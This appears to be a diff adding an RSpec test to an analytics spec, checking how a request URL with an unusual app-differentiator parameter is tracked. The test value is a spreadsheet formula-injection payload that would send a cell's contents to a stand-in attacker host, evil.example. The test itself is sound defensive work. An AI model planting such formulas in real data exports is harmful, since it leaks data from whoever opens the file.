@@ -492,5 +492,16 @@ RSpec.describe Analytics do
 
       include_examples 'track event with :sp_request'
     end
+
+    context 'a request_url with a login_gov_app_differentiator that is not a plain identifier' do
+      let(:request_url) do
+        UriService.add_params(
+          'http://localhost:3000/openid_connect/authorize',
+          login_gov_app_differentiator: '=HYPERLINK("https://evil.example/?d="&A3,"Click")',
+        )
+      end
+
+      include_examples 'track event with :sp_request'
+    end
   end
 end
